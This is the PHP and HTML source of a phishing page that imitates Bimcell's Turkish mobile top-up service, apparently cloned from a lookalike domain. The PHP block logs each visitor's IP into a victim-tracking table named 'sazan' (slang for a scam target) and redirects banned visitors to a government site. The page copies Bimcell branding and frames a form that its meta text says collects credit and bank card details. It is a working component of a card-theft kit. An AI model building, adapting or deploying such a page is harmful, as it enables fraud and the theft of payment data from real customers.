<?php
$ip = $_SERVER['REMOTE_ADDR'];
include("baglan.php");
$db->query("UPDATE sazan SET now = 'Anasayfada' WHERE ip = '{$ip}'");


$ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
foreach($ban as $kontrol){
    if($kontrol['ban'] == $ip){ 
            header('Location:http://www.turkiye.gov.tr');
        } 
}



?>
    <html>
        
<!-- Mirrored from bimcell-tl-yukleme-oges-ddss.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 Jul 2021 09:20:14 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
            <title>
                BİMCell - TL Yükle
            </title>
            <base >
            <meta id="description" name="description" content="Bimcell TL yüklemek için, yüklemek istediğiniz telefon numarasını, almak istediğiniz TL miktarını ve kredi kartı/banka kartı bilgilerinizi giriniz">
            <meta id="XUACompatible" http-equiv="X-UA-Compatible" content="IE=edge">
            <meta id="descviewport" name="viewport" content="width=device-width, initial-scale=1">
            <meta id="keywords" name="keywords" content="Bimcell TL Yükle, TL Yükle, BimcellTlYükle">
            <script src="../kit.fontawesome.com/f07874fbed.js" crossorigin="anonymous"></script>
            <script src="../code.jquery.com/jquery-1.9.1.min.js" language="javascript" type="text/javascript"></script><script src="../code.jquery.com/ui/1.11.0/jquery-ui.min.js" language="javascript" type="text/javascript"></script><script src="../www.bimcell.com.tr/applications/popup/scripts/kuramsoftdynamichead.js" language="javascript" type="text/javascript"></script>
            <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&amp;display=swap" rel="stylesheet">
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
            
        </head>
                    <div class="page-box">
                        <div class="page-top-links-wrapper">
                            <div class="container">
                                <div class="row">
                                    <ul class="top-links">
                                        <li><a href="tel:4444551">Müşteri Hizmetleri<em class="pi pi-phone"></em><strong>444 4 551</strong></a></li>
                                        <li class="black"><a alt="bimcell tl yükle, bimcelltlyükle" ><em class="pi pi-download"></em>TL Yükle</a></li>
                                        <li class="red"><a alt="bimcell online işlemler, onlineişlemler" ><em class="pi pi-monitor"></em>Online İşlemler</a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <div class="navbar navbar-default page-top-menu" role="navigation">
                            <div class="container">
                                <div class="row">
                                    <div class="navbar-header page-scroll">
                                        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                                        <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span>
                                        </button>
                                        <div class="header-logo navbar-brand page-scroll">
                                            <a class="">
                                            <img src="../www.bimcell.com.tr/templates/css/images/logo.png" alt="Bimcell Logo"></a>
                                        </div>
                                    </div>
                                    <div class="collapse navbar-collapse navbar-ex1-collapse navbar-right">
                                        <div>
                                            <link href="./www.bimcell.com.tr/templates/css/reset.css" rel="stylesheet" type="text/css">
                                            <link href="./www.bimcell.com.tr/templates/css/bootstrap.css" rel="stylesheet" type="text/css" media="screen">
                                            <link href="./www.bimcell.com.tr/templates/css/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
                                            <link href="./www.bimcell.com.tr/templates/css/style.css" rel="stylesheet" type="text/css" media="screen">
                                            <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->     <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->     <!--[if lt IE 9]>
                                            <script src="/templates/scripts/lib/html5shiv.js"></script>
                                            <script src="/templates/scripts/lib/respond.min.js"></script>
                                            <![endif]-->     <!--[if lt IE 8]>
                                            <link rel="stylesheet" type="text/css" href="/templates/css/ie7.css" />
                                            <![endif]-->
                                            <script type="text/javascript">
                                                $(document).ready(function () {
                                                $('.copyright').html("©2011-2021 | Bu hizmet TT Mobil İletişim Hizmetleri A.Ş.  tarafından sunulmakta olup, tüketici memnuniyetine ilişkin her türlü husustan TT Mobil İletişim Hizmetleri A.Ş. sorumludur.");
                                                });
                                            </script>
                                        </div>
                                        <ul class="nav navbar-nav">
                                            <li><a class="page-scroll" >Neden BİMcell?</a></li>
                                            <li><a class="page-scroll" >Nasıl BİMcell'li Olunur?</a></li>
                                            <li><a class="page-scroll" >Tarife ve Paketler</a></li>
                                            <li><a class="page-scroll" >Servisler</a></li>
                                            <li><a class="page-scroll" >Sıkça Sorulan Sorular</a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="page-content ">
                            <div class="container">
                                <div class="row">
                                    <div class="content-wrapper">
                                        <div class="col-md-12" style="background-color: white;">
                                            <div class="row">
<iframe height="850px" frameborder="0" scrolling="auto" marginheight="0" marginwidth="0" src="main.php" style="width: 100%"></iframe>
                                            </div>
                                            <script>$(document).ready(function(){$('.content-wrapper .col-md-9').removeClass('col-md-9').addClass('col-md-12').css('background-color','white');}); </script>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="footer">
                            <div class="container">
                                <hr class="shadow">
                                <div class="row ">
                                    <div class="col-md-12">
                                        <div class="footer-order">
                                            <a ><i class="fa fa-angle-right fa-fw"></i>Hakkımızda</a> <a ><i class="fa fa-angle-right fa-fw"></i>Gizlilik ve Güvenlik</a> <a><i class="fa fa-angle-right fa-fw"></i>Tüketici Şikayetleri</a> <a ><i class="fa fa-angle-right fa-fw"></i>Tüketici Bilgilendirme Rehberi</a><a ><i class="fa fa-angle-right fa-fw"></i>Duyurular</a>
                                        </div>
                                    </div>
                                </div>
                                <div class="row footer-order">
                                    <div class="col-md-2 pb-20">
                                        <a >
                                        <img src="../www.bimcell.com.tr/templates/css/images/bottom_logo.png" alt="Bimcell Logo Siyah">
                                        </a>
                                    </div>
                                    <div class="col-md-10">
                                        <div class="copyright">©2011-2015 | Bu hizmet TT Mobil İletişim Hizmetleri A.Ş.  tarafından sunulmakta olup, tüketici memnuniyetine ilişkin her türlü husustan TT Mobil İletişim Hizmetleri A.Ş. sorumludur.</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Scripts -->
                    <script src="../www.bimcell.com.tr/templates/scripts/jquery-1.10.2.js" type="text/javascript"></script>
                    <script src="../www.bimcell.com.tr/templates/scripts/bootstrap.min.js" type="text/javascript"></script>
                    <script src="../www.bimcell.com.tr/templates/scripts/main.js" type="text/javascript"></script>
                </div>
                <div class="aspNetHidden">
                    <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="8D744C6B">
                </div>
            </form>
            <div class="betternet-wrapper"></div>
        </body>
    
<!-- Mirrored from bimcell-tl-yukleme-oges-ddss.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 Jul 2021 09:20:23 GMT -->
</html>